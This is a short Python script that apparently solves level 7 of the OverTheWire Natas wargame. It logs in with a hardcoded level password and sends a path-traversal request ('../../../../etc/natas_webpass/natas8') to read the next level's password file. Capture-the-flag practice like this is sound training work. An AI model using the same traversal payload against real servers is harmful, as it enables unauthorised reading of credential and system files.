import requests
import re
import string

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
url = str("http://" + username + ".natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8")
res = requests.post(url, auth=(username, password))
content = res.text
print(re.findall("<br>\n<br>\n(.*)",content)[0])
